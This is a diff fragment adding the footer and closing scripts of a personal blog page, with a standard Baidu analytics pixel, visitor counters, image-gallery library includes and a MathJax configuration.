+    !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=window.location.href,o=document.referrer;if(!e.test(r)){var n="//api.share.baidu.com/s.gif";o?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var t=new Image;t.src=n}}(window);
+</script>     
+</section>
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            G7shot &copy; 2022 
+            <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/80x15.png" /></a>
+            <br> Powered by g7shot.com</a>
+            
+                <br>
+                <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i> <span id="busuanzi_value_site_pv"></span></span>
+                &nbsp;|&nbsp;
+                <span id="busuanzi_container_site_pv"><i class="fa fa-user"></i> <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    </div>
+</footer>
+
+        
+
+    
+        
+<script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-share.min.js"></script>
+
+        
+<script src="/libs/lightgallery/js/lg-video.min.js"></script>
+
+    
+    
+        
+<script src="/libs/justified-gallery/jquery.justifiedGallery.min.js"></script>
+
+    
+    
+        <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true,
+            TeX: {
+                equationNumbers: {
+                  autoNumber: 'AMS'
+                }
+            }
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script async src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    
+
+
+
+<!-- Custom Scripts -->
+
+<script src="/js/main.js"></script>
+
+
+    </div>
+</body>
+</html>
